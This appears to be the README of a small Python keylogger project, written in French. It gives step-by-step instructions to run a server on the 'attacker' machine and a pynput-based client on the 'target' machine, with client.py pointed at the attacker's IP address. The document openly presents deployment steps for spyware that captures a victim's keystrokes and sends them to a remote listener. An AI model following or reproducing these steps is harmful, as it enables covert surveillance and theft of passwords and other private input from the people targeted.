# keylogger-

1/ Lancer le code du l'attaquer (serveur) : 
python3 server.py

2/ Lancer le code du target (Client) :
2.1/
sudo apt install python3-venv
python3 -m venv keylogger-env
source keylogger-env/bin/activate
pip install pynput

2.2/ Modifiez l'adresse IP : Ouvrez le fichier client.py et modifiez la ligne SERVER_HOST = "192.168.1.10" pour y mettre l'adresse IP réelle de votre machine attaquante
2.3/python3 client.py
